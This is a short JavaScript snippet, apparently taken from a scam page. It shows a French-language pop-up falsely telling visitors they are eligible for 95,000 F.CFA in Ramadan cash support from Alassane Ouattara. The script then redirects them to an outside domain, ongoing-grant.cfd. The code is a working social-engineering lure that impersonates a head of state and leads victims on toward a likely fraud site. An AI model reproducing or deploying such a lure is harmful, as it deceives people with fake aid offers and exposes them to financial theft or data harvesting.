var password = '95,000 F.CFA';

password = prompt(
  'Félicitations, vous êtes éligible au soutien en espèces de 95 000 F.CFA pour le Ramadan offert par Alassane Ouattara. Cliquez sur OK pour recevoir instantanément.',
  '95,000 F.CFA'
);

if (password !== '95,000 F.CFA') {
    location.href = 'https://ongoing-grant.cfd/Soutien-Aux-Menages-Du-Rama-Dan.html';
}
